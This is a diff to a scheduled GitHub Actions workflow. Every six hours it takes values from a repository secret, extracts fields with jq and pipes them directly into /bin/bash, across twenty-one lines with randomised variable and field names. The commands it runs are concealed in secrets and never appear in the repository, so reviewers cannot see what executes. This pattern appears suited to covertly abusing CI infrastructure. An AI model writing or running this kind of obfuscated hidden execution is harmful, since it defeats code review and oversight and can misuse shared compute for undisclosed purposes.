@@ -2,18 +2,37 @@ name: huangjiao2315
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 0/6 * * *'
+    - cron: '27 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huangjiao2315
         env:
-          p70: ${{ secrets.p70 }}
+          rk75: ${{ secrets.rk75 }}
         run: |
-          echo $p70 | jq -r .l89357 | /bin/bash
-          echo $ggfci8 | jq -r .yf59027 | /bin/bash
-          echo $p9214 | jq -r .tu5950 | /bin/bash
+          echo $rk75 | jq -r .cb807 | /bin/bash
+          echo $xiamy85 | jq -r .l3832 | /bin/bash
+          echo $sszp92 | jq -r .c717 | /bin/bash
+          echo $osyse873 | jq -r .vsj08 | /bin/bash
+          echo $aztxl5 | jq -r .c831 | /bin/bash
+          echo $sqosc7230 | jq -r .mui03 | /bin/bash
+          echo $jujdr08978 | jq -r .zaqkv5 | /bin/bash
+          echo $ciwg2 | jq -r .sl6 | /bin/bash
+          echo $ulrbo77156 | jq -r .dfqy017 | /bin/bash
+          echo $wo2 | jq -r .i051 | /bin/bash
+          echo $si64174 | jq -r .lk90 | /bin/bash
+          echo $sdpid7901 | jq -r .rjt863 | /bin/bash
+          echo $slr84704 | jq -r .hucy6359 | /bin/bash
+          echo $p7929 | jq -r .sjt3 | /bin/bash
+          echo $t72 | jq -r .omphm07 | /bin/bash
+          echo $j282 | jq -r .d750 | /bin/bash
+          echo $aq9 | jq -r .bas0 | /bin/bash
+          echo $hoaet1331 | jq -r .vwds9704 | /bin/bash
+          echo $uo4 | jq -r .nbbqg364 | /bin/bash
+          echo $f563 | jq -r .p319 | /bin/bash
+          echo $tcmwr21 | jq -r .c976 | /bin/bash
 
